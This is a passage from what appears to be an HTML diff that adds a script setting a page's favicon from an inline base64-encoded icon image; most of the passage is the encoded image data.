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AH+/wEBrP8AAfX/AAH+/wEC8v8BAb//AAGs/wEAgf8WFSv/jIyM//39/P/9/fz//f38//39/P/9/fz//f38//39/P/9/fz//f39/+zr6/9PT07/cW9r/yIiIf+Pj47/8PDv//39/P/9/f3//f38//39/f/9/f3//f38//39/P/9/f3/8fHx/ycnJv8CAhH/AQA8/wEBbf8BAaj/AQHQ/wEC5f8BAvP/AAL+/wAC/v8AAvr/AAL8/wAB/f8AAez/AQHO/wABrP8BAYP/AQFS/wEBKf8DAiL/EQs1/xUPK/99fHv/5eXk//39/P/9/fz//f39//39/P/9/fz//f38//39/P/9/f3//v39/+bm5v8+Pj3/GRkZ/6ysrP/9/fz//f38//39/f/9/fz//f38//39/P/9/f3//f38//39/P/9/fz//f39/+Hh4P9NS1H/Iw9P/x0NRf8SCCr/CgUZ/wgEFP8HAyD/CAU4/wcGQP8IBj3/CQYy/woHIf8MCRr/EQwm/xoROf8lGVL/MCBr/z4pif9LMqb/TjSx/yYfPv+1tbX//f39//39/f/9/fz//f38//39/P/9/fz//f38//39/f/9/fz//f39//Ly8v+cnJz/xMTE//39/f/9/fz//f39//39/P/9/fz//f38//39/P/9/fz//f38//39/f/9/fz//f39//n5+f99fX3/JBFN/zsZif87Gon/OhmG/zcZf/87IIT/PieJ/z4oiP8+KYr/QCuP/0QumP9KMqX/TzWv/081sP9PNbD/Tzaw/1A1sP9PNbD/TTOq/yIhJ//Y2Nf//f39//39/f/9/f3//f39//39/f/9/f3//f39//39/P/9/fz//f39//39/f/6+vr//Pz8//39/f/9/f3//f39//39/f/9/fz//f38//39/P/9/f3//f39//39/P/9/f3//f39//39/f+7u7r/HBgm/zoZh/87Goj/OxqI/0Uom/9PNK3/UDav/1A2sP9PNrD/Tzaw/082sP9PNq//UDaw/1A2sP9QNrD/UDaw/1A2sP9QNrD/PCiF/zAwMP/4+Pf//f39//39/f/9/f3//f38//39/f/9/f3//f39//39/f/9/f3//f39//39/f/9/f3//f79//39/f/9/f3//f39//39/f/9/fz//f39//39/P/9/f3//f39//39/f/9/f3//f39//39/P/29fT/Nzg3/yQQU/87Gon/PR2N/081rv9QNq//UDav/1A2sP9QNrD/Tzav/082r/9PNq//Tzav/082r/9PNrD/UDaw/1A2r/9PNa//JRhR/3R0c//9/fz//f39//39/f/9/f3//f39//39/f/9/f3//f39//39/P/9/f3//f39//39/f/9/f3//f39//39/f/9/f3//f39//39/f/9/f3//f39//39/f/9/fz//f38//39/P/9/fz//f38//39/P/9/f3/rKyr/w8IHf81F3v/QiOV/1A2r/9QNq//UDaw/1A2sP9PNrD/Tzaw/083sP9PNq//Tzav/082r/9PNq//UDaw/1A2sP9JMaH/Eg0k/83Nzf/9/fz//f39//39/f/9/f3//f39//39/f/9/f3//f39//39/f/9/f3//f39//39/f/9/f3//f39//39/f/9/f3//f39//39/f/9/f3//f38//39/f/9/fz//f39//39/f/9/fz//f38//39/f/9/fz/+Pj4/11cXv8hDkv/QSOU/1A2r/9QNq//UDaw/1A2sP9PNrD/Tzaw/082sP9PN6//Tzav/082r/9PNq//Tzaw/1A1r/8xIGz/VVRZ//v7+v/9/fz//f39//39/f/9/f3//f39//39/f/9/f3//f39//39/f/9/f3//f39//39/f/9/f3//f39//39/f/9/f3//f39//39/f/9/fz//f38//39/f/9/fz//f38//39/P/9/fz//f38//39/P/9/fz//f38/9zc2/80MTr/MBlt/081rv9QNq//UDaw/082r/9PNrD/Tzaw/082r/9PNq//Tzav/082r/9PNq//TzWw/0Qtlv8xK0T/0tLR//39/P/9/f3//f39//39/f/9/f3//f39//39/f/9/f3//f39//39/f/9/f3//f39//39/f/9/f3//f39//39/f/9/f3//f39//39/P/9/fz//f38//39/P/9/fz//f38//39/P/9/fz//f38//39/P/9/fz//f38//v7+//DxMP/Qj9L/zMicP9ONaz/Tzaw/082sP9PNrD/Tzaw/082sP9PNq//Tzaw/082sP9PNrD/Qy2V/yskRf+np6f/+fn5//39/f/9/f3//f39//39/f/9/f3//f39//39/P/9/fz//f38//39/P/9/f3//f39//39/f/9/f3//f39//39/f/9/f3//f39//39/P/9/fz//f38//39/P/9/fz//f38//39/P/9/fz//f38//39/f/9/fz//f38//39/P/8/Pv/4+Pj/0VDTP8rHl//TTSq/082r/9PNrD/Tzav/082sP9PNq//Tzaw/082sP9AK4//GhUt/62srP/4+Pj//f39//39/f/9/f3//f39//39/f/9/f3//f39//39/P/9/fz//f38//39/P/9/fz//f38//39/f/9/f3//f39//39/f/9/f3//f39//39/f/9/fz//f38//39/P/9/fz//f38//39/P/9/fz//f38//39/P/9/fz//f39//39/P/9/f3//f38/+Xl5f9VVVX/Jh8+/zongP9FLpn/STGh/0kxov9HMJ7/Qy2W/zMlaP84NUH/uLi4//39/f/9/f3//f39//39/f/9/f3//f39//39/f/9/f3//f38//39/P/9/fz//f38//39/P/9/fz//f38//39/f/9/f3//f39//39/P/9/fz//f38//39/f/9/fz//f38//39/P/9/fz//f38//39/P/9/fz//f39//39/P/9/fz//f38//39/P/9/f3//f39//39/f/x8fH/r6+v/29vcP9RTl3/QDlX/z43WP9RS2P/amlw/5SUk//i4uH//f39//39/f/9/f3//f39//39/f/9/f3//f39//39/P/9/fz//f38//39/P/9/fz//f38//39/f/9/fz//f38//39/f/9/f3//v38//79/f/9/fz//f38//39/f/9/fz//f38//39/f/9/fz//f39//39/P/9/fz//f38//39/f/9/fz//f38//39/f/9/f3//f39//79/P/9/f3//v39//j39//r6ur/4uHh/+Hg4P/o6Oj/9fX0//39/P/9/f3//f39//39/f/9/f3//f39//39/f/9/f3//f38//39/P/9/fz//f38//39/f/9/fz//f38//39/P/9/fz//f38/wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=="
+  var docHead = document.getElementsByTagName('head')[0];
+  var newLink = document.createElement('link');
+  newLink.rel = 'shortcut icon';
+  newLink.href = 'data:image/png;base64,' + favIcon;
+  docHead.appendChild(newLink);
+});
+    </script>
+  </body>
+</html>
